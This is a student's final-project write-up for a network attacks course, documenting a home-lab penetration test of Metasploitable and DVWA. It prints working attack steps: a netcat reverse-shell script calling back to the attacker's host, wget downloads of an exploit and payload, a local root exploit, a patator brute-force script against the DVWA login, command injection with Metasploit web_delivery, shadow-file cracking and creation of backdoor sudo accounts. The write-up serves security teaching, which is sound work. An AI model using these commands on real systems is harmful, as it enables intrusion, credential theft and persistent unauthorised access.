# Network Attacks Final Project

#### **ITN 261-002N - Network Attacks and Hacking - Fall 2021**

#### Ronald Phillips

###### Northern Virginia Community College

###### Prof. Necmi Mutlu PhD

#### I. Introduction

​	This scenario will demonstrate an attack against two target machines.  The machines are installed according to the source instructions and are setup in default configurations.  Due to the nature of the installation process, the root username and passwords are known ahead of time, but will not be used unless they can be ostensibly extracted from the machines themselves.

​	The target IP addresses were obtained by an Nmap host scan.

​	Kali Linux 2 is installed on the attacking machine, and has been updated to the latest release of the operating system and tools.



<u>**Topology**</u>

![Topology](/Topology.png)



| target                                                       | target2                                        | kali                                | nessus                                                       |
| ------------------------------------------------------------ | ---------------------------------------------- | ----------------------------------- | ------------------------------------------------------------ |
| [Metasploitable](https://information.rapid7.com/download-metasploitable-2017.html) | [Damn Vulnerable Web App](https://dvwa.co.uk/) | [Kali Linux](https://www.kali.org/) | [Nessus Virtual Appliance](https://www.tenable.com/downloads/tenable-appliance?loginAttempted=true) |
| 192.168.1.209                                                | 192.168.1.210                                  | 192.168.1.86                        | 192.168.1.188                                                |
| msfadmin:msfadmin                                            | dvwa:dvwa                                      | kali:kali                           | ---------------------------                                  |



#### II. Target 1: Metasploitable

​	This is a virtual machine imported into a vSphere infrastructure of [Metasploitable](https://information.rapid7.com/download-metasploitable-2017.html).  Metasploitable is an intentionally vulnerable Linux machine designed for Penetration Testing.  The goal for this target will be to explore some of the more interesting vulnerabilities included in this distribution (specifically because there are some very quick and easy attack vectors available throughout this project).

 

##### A) Enumeration

##### 192.168.1.209

​	To begin, we start with a basic script scan using Nmap.  Nmap is a network scanning tool used to enumerate networks.  It has the capability to identify hosts, open ports, and running services on the network on which it was run. The output file containing the results can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target/scans/nmapinitial). 

| Port      | State | Service     | Version                             |
| --------- | ----- | ----------- | ----------------------------------- |
| 1099/tcp  | open  | java-rmi    | GNU Classpath grmiregistry          |
| 111/tcp   | open  | rpcbind     | 2                                   |
| 139/tcp   | open  | netbios-ssn | Samba smbd 3.X - 4.X                |
| 1524/tcp  | open  | bindshell   | Metasploitable root shell           |
| 2049/tcp  | open  | nfs         | 2-4                                 |
| 21/tcp    | open  | ftp         | vsftpd 2.3.4                        |
| 2121/tcp  | open  | ftp         | ProFTPD 1.3.1                       |
| 22/tcp    | open  | ssh         | OpenSSH 4.7p1 Debian 8ubuntu1       |
| 23/tcp    | open  | telnet      | Linux telnetd                       |
| 25/tcp    | open  | smtp        | Postfix smtpd                       |
| 3306/tcp  | open  | mysql       | MySQL 5.0.51a-3ubuntu5              |
| 3632/tcp  | open  | distccd     | distccd v1                          |
| 445/tcp   | open  | netbios-ssn | Samba smbd 3.0.20-Debian            |
| 44542/tcp | open  | mountd      | 1-3                                 |
| 50726/tcp | open  | java-rmi    | GNU Classpath grmiregistry          |
| 512/tcp   | open  | exec        |                                     |
| 513/tcp   | open  | login       |                                     |
| 514/tcp   | open  | shell       |                                     |
| 52891/tcp | open  | nlockmgr    | 1-4                                 |
| 53/tcp    | open  | domain      | ISC BIND 9.4.2                      |
| 5432/tcp  | open  | postgresql  | PostgreSQL DB 8.3.0 - 8.3.7         |
| 56624/tcp | open  | status      | 1                                   |
| 5900/tcp  | open  | vnc         | VNC                                 |
| 6000/tcp  | open  | X11         |                                     |
| 6667/tcp  | open  | irc         | UnrealIRCd                          |
| 6697/tcp  | open  | irc         | UnrealIRCd                          |
| 80/tcp    | open  | http        | Apache httpd 2.2.8                  |
| 8009/tcp  | open  | ajp13       | Apache Jserv                        |
| 8180/tcp  | open  | http        | Apache Tomcat/Coyote JSP engine 1.1 |
| 8787/tcp  | open  | drb         | Ruby DRb RMI                        |

​	There are many open ports with at first glance looks like many different attack vectors.  In order to help decide where to start, we scan once more with Nmap, this time using the "--script=VULN" parameter.  This will apply a set of scripts to the machine that will attempt to identify known vulnerabilites.

​	One vulnerability that I hadn't seen before was the "distccd" service on port 3632/TCP.  Distcc, or distributed C/C++ compiler, is a platform that speeds up the compilation of C and C++ programs by using resources across a network.  This was used in a time in which computer systems were much slower, and compiling a C program could take hours or even days.

##### B) Exploiting distcc using Armitage

​	On examination of the Metasploit module [source code](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/misc/distcc_exec.rb), I will use Armitage to simplify the process instead of developing a new exploit. 

![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/armsetup.PNG)

![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/shell.PNG)

​	We now have a basic shell under the user "daemon".  Next we will stabilize our shell (make it a full fledged TTY interface).  With a guess that python was installed, I stabilized with a one-liner of python code

```python
python -c ‘import pty; pty.spawn(“/bin/sh”)’
```

![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/stable.PNG)

​	The next step is to escalate our privileges to root.  

##### C) Obtaining root access

​	We will switch back to the console driven msfconsole, and rerun our exploit to obtain a better terminal experience.  By executing the following lines on our terminal, we can find some valuable information about the system.

```bash
uname -a
lsb_release -a
```

![login](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/uname.PNG)

​	After using searchsploit to research, I decided on a privilege escalation method found [here](https://www.exploit-db.com/exploits/8572).  First, we download the exploit source code and save it as "8572.c".  Then we create a new file, "run
", and insert and save the following code:

```bash
#!/bin/bash
nc 192.168.1.210 12345 -e /bin/bash
```

​	We save this, and start up the Python simple.http server with port 8080 on our attack box in the folder.  On the target, we execute the following to download our exploit and payload.

```bash
cd /tmp
wget http://192.168.1.210:8080/run
wget http://192.168.1.210:8080/8572.c
```

​	Then we compile the C code on the target machine into an executable file.

```bash
gcc -o exploit 8572.c
```

​	Now we have our payload compiled and ready to run on our target system.  When we execute it, it will execute the code in the "run" file, which instructs the system to call back to our attack box with a reverse bash shell (/bin/bash) that possesses root permissions.

​	Before this happens, there are a few more steps.  The documentation indicated that we need to provide the exploit with the PID of the udevd netlink socket.  We can find it easily with

```bash
cat /proc/net/netlink
```

![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/pid.PNG)

​	We are looking for a process with a PID of something other than 0. Next we start a netcat listener on another terminal with:

```bash
nc -lvp 12345
```

We pass the PID into the exploit and run it with:

```bash
./exploit 2761
```

![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/reverseroot.PNG)

​	Success!  Now we stabilize our shell once more.

![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/stabileroot.PNG)

​	Next, we dump the /etc/shadow file to a text file, and pass that file into John the Ripper.

![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/creds.PNG)

Success!  We have admin credentials!

#### msfadmin:msfadmin

​	Now we can SSH into the system with full root privelidges.

![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/ssh.PNG)



##### D. Creating a root user

​	We will now create a new sudo user, with our own credentials.  Using visudo, we see that sudo users in this system are members of the "admin", and does not have a "sudo" or "root" group created.  We add a user and then add it to the correct group.

```bash
sudo adduser jjay1288
sudo usermod -aG admin jjay1288
```

![enumsetup](https://github.com/jjay1288/netattacksproj/blob/main/target/screens/adminuser.PNG)

##### E) Conclusion

​	This machine was understandably riddled with attack vectors.  Many of the attack vectors found on this server are due specifically to outdated and unpatched software.  The distribution is way out of date, and the ability to connect to ubuntu repositories has been intentionally disabled.





#### III. Target 2: Damn Vulnerable Web Application (DVWA)

​	This machine is running the latest Ubuntu (21.04), and has had [Damn Vulnerable Web App](https://dvwa.co.uk/) installed in its default configuration.  DVWA is an intentionally vulnerable web stack that has built in attack vectors.



##### A) Enumeration

##### 192.168.1.210

​	Once again, I will start with a default script scan on the target through Nmap.  The results can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/scans/nmapinitial). This time, the results are drasticly different. 

| Port   | State | Service | Version                         |
| ------ | ----- | ------- | ------------------------------- |
| 22/tcp | open  | ssh     | OpenSSH 8.4p1 Ubuntu 5ubuntu1.1 |
| 80/tcp | open  | http    | Apache httpd 2.4.46             |

​	We find only two ports, SSH on 22 and http on 80.  Obviously this is a web server, and must enumerate on the machine through other means.  Navigating to http:\\\192.168.1.210 in the browser presents us with a login screen:

​											![login](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/login.PNG) 

​	The next step is to find out if there are any interesting directories on this web app.  We will start a  [DirBuster](https://www.kali.org/tools/dirbuster/) loaded with the directory-list-medium that comes in kali and scan. The results of this scan can be found [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/scans/DirBusterReport-192.168.1.210-80.txt).  Dirbuster does this by tracking responses from the web server.  A "Not Found" reply means nothing exists there, while "Permission Denied" will indicate that the directory exists.



##### B) Attacking the login page

​	The first step in attacking this machine is to get past the login page.  We must login to enumerate further.  For now, we can only infer that pages exist based on the return code of the dirbuster requests.  The first step is to have a look at the source code of [login.php](https://github.com/jjay1288/netattacksproj/blob/main/target2/loginpage/source.txt).

​	Immediately we see the fields for username and password, and we also see something that appears to be an anti-CSRF token:

```html
<input type='hidden' name='user_token' value='b57304890574bb9053c0c4f48d307773' />
```

​	These types of tokens are meant to prevent Cross Site Request Forgeries by ensuring that the client that is requesting or posting http content to the site is the same one that opened the initial connection.  The web app will generate a random token and present it to the client on the first load of login.php.  

Using Burp Suite to proxy the http requests, you can see that the initial connection will also return a response from the server setting up a cookie:

![cookie](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/setcookie.PNG)

​	My initial instinct is that the basic security feature at play here is a server-side check to compare the PHPSESSID to the user_token.  Using Burp to intercept the traffic, we confirm this is the case.

![post](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/post.PNG)

![postresult](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/postresult.PNG)

**We also see that the site sends login information over http in plain text!**

​	By inspecting the source code again, we find that the login fails, and the clients is redirected to the login.php once again, which also issues a new user_token.

```html
<input type='hidden' name='user_token' value='25a83cbcfe8ebad257d6416ad9817699' />
```

​	This presents a challenge for brute forcing the login page, as each POST request we make to the web server will require the correct values for PHPSESSID and user_token or the request will automatically be rejected.   Burp Suite can be configured to use macros to update any value in a request by issuing a quest immediately before your brute force request, then transferring in the correct values.  In practice, I found this very cumbersome to enable, and was only able to get the correct setup once (before crashing my attack box by turning the worker threads up way too high).  It was simple to get the user_token updated, but there was some configuration I must have changed that disabled the session/cookie handling in Burp, preventing it from updating cookies.  I started to research alternatives, and [what I ultimately found](https://blog.g0tmi1k.com/dvwa/login/) was more elegant, and much faster:

```shell
CSRF=$(curl -s -c dvwa.cookie "192.168.1.210/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=1  timeout=10 \
  url="http://192.168.1.210/login.php" \
  1=/usr/share/wordlists/fasttrack.txt  0=/usr/share/wordlists/fasttrack.txt \
  body="username=FILE1&password=FILE0&user_token=${CSRF}&Login=Login" \
  header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \
  -x quit:fgrep=index.php
```

​	We can look at this shell script by element to understand the brute force attack.

​	The first two commands initiate global shell variables, and then pass shell commands to set the value of these variables.

###### CSRF:

```shell
curl -s -c dvwa.cookie "192.168.1.210/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2
```

​	This code first sends a request to the web server, and saves the cookie into a file, then uses awk and cut to trim it to just the value needed, then stores it as $CSRF.

###### SESSIONID:

```shell
grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}'
```

​	Then this code performs grep on the cookie file and trims it to just the value needed, then stores it as $SESSIONID.

​	Next, we will use [patator](https://www.kali.org/tools/patator/#:~:text=Patator%20is%20a%20multi%2Dpurpose,it%20supports%20the%20following%20modules%3A&text=smtp_login%20%3A%20Brute%2Dforce%20SMTP,users%20using%20SMTP%20RCPT%20TO) to fuzz the http request, and brute force the login panel.  Patator is a brute-forcer by design, and we can use it to repeatedly send POST requests, each time changing the values that we insert into the request.

```shell
patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=1  timeout=10 \
  url="http://192.168.1.210/login.php" \
  1=/usr/share/wordlists/fasttrack.txt  0=/usr/share/wordlists/fasttrack.txt \
  body="username=FILE1&password=FILE0&user_token=${CSRF}&Login=Login" \
  header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \
  -x quit:fgrep=index.php
```

​	In this command we set some options for patator (http fuzzing, POST, etc), then craft a POST message for the request.  We pass in the fasttrack.txt wordlist that comes with kali due to the belief that the default login would not be complex (which is probably the main reason that this attack is possible).  We then insert the two variables.  The last line tells potator when to quit searching by searching in the response for index.php. This works because when inspecting the initial Burp intercepts, the HTTP return code is always 3XX, which indicates a redirect. This feels like further attempts at obfuscation as upon a successful login, you can't assume that the response code will be a 200.  The server could simply redirect you to another page that you would ostensibly then have permissions to view.  As for the choice of index.php, this is a typical home page for most PHP based sites.

​	We save our script as loginexploit.sh, modify it to be executable, then run:

```shell
chmod +x loginexploit.sh
./loginexploit.sh
```

![postresult](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/logincreds.PNG)

And we have our login credentials!

#### admin:password

​	I also noticed that it seems like we use the same PHP session ID and user_token for every request (unless potator does some hidden magic to request values and change variables).  I believe this works because both the request we crafted in potator, and the original curl request we used to get our cookie, do not include the "Connection: close" parameter, and thus never close that initial connection, allowing us to use the same PHPSESSID and user_token because they were definitely valid. 

​	We go to the page in Firefox and enter our credentials, and are presented with index.php.

![postresult](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/index.PNG)

I guess this Brute Force section would have been much easier to exploit.

![postresult](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/easy.PNG)



##### C. Obtaining a reverse shell

​	To obtain a shell, we will use the "Command Injection" sub-page in DVWA.

![shell](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/commandinjectpage.PNG)

​	After doing some testing the form, we find that you can enter an IP address and then follow it with a semicolon to execute shell commands on the target. 

![shell](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/poc.PNG)

We will start up Metasploit and set up our attack. We will use the [web_delivery](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) module within msfconsole.  

![msf](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/msfsetup.PNG)

Then we copy the command (with a small edit for my specific version of php) at the bottom and submit it to the web app to get our reverse shell!

![shell](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/inject.PNG)

![shell](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/shell.PNG)

![shell](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/meterp.PNG)

##### D. Enumeration

​	Because this web app is installed on a fully up to date LAMP stack, further exploitation is unlikely.  The apache configs that come standard will still only allow a user to operate within the set confines of the web user (which is very restrictive).  Any further exploitation of this target would probably constitute 0-Day status for the Ubuntu OS itself.  Using Metasploit's exploit suggester we can confirm this.

![msf](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/suggest.PNG)

​	We can do some other basic enumeration, and we do find an interesting entry in the user list; "dvwa".  This user has the UID of 1000, so we can infer that it is the first non-root user created on the system.  Best practices on installing linux are to leave the root account disabled, and give another user the superuser privileges (this happens by default on Ubuntu).

![msf](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/uid.PNG)

​	By manually attempting to ssh into the box as this user using some common weak passwords, we are rewarded with a new account!

![msf](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/root1.PNG)

#### dvwa:dvwa

​	Now we can dump the password hashes, and have full control of the machine.  For good measure, we run the [LinEnum](https://github.com/rebootuser/LinEnum) script and dump the contents [here](https://github.com/jjay1288/netattacksproj/blob/main/target2/enum/linenum).

##### E. Creating a root user

​	Finally, as with the previous target, we will create a root user on the system.  This will be done similarly to before, except we will add our user to the sudo group. 

```bash
sudo adduser jjay1288
sudo usermod -aG sudo jjay1288
```

![msf](https://github.com/jjay1288/netattacksproj/blob/main/target2/screens/rootcred.PNG)

##### F. Conclusion

​	One point that stood out prominently to me is the fact that a secure password is very important, even with other somewhat strong security measures.  The initial login page was not using the best security policies in the world; it could have locked me out after the initial work with burp suite.  However, because the root password was the same string as the username, and reasonable attacker would have access in a negligible amount of time.



#### IV. Nessus Examination

​	Finally, we will use the  [Nessus Virtual Appliance](https://www.tenable.com/downloads/tenable-appliance?loginAttempted=true) to examine the machines.  Nessus is a vulnerability scanner that allows network administrators to easily identify critical vulnerabilities in their networks.  After the initial setup, we configure for a full scan on our target systems.  We have enabled almost every scan option included in Nessus, so this scan will take some time.

![msf](https://github.com/jjay1288/netattacksproj/blob/main/nessus/inprog.PNG)

A complete detailed report can be found here:

[Nessus Detailed Report](https://github.com/jjay1288/netattacksproj/blob/main/nessus/Full_Scan.pdf)

​	As expected, the Metasploitable system is riddled with vulnerable applications.  Nessus even discovered a version of UnrealIRCd that included a backdoor!

![msf](https://github.com/jjay1288/netattacksproj/blob/main/nessus/t21.PNG)

![msf](https://github.com/jjay1288/netattacksproj/blob/main/nessus/irc.PNG)

​	Almost every one of the critical severity vulnerabilities would quickly result in full root access. The DVWA instance. also as expected, had far fewer vulnerabilities.  Any real attacker would have a field day on a system like this.

![msf](https://github.com/jjay1288/netattacksproj/blob/main/nessus/t22.PNG)

​	All of the high severity items on this list are related to the intentionally vulnerable web stack, and almost nothing pertaining to services outside of that scope.  Nessus is even able to identify web directories and backup files that are accessible to anyone.  



#### V. General Conclusion

​	In short, these systems fulfilled the objectives for which they were created.  They provided an opportunity to learn various techniques for attacking a computer system, and some were even quite challenging.  

​	Generally, the main learning points from this project are:

1. Using a strong password is probably the most effective method of securing a system.  To improve upon that, one could implement multi-factor authentication for even more security
2. Updating system and application software is the only way to ensure that discovered exploits in the wild will not affect your system

​	Personally, even though I have segregated these virtual machines from the rest of my network through a pfSense appliance, and have my entire network sitting behind a NAT router, I will still be happy to be able to remove these machines from my network!
